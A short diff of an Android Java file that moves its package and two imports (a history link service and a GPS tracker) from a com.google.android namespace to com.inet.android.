@@ -1,10 +1,10 @@
-package com.google.android.bs;
+package com.inet.android.bs;
 
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
-import com.google.android.history.LinkService;
-import com.google.android.location.GPSTracker;
+import com.inet.android.history.LinkService;
+import com.inet.android.location.GPSTracker;
 
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
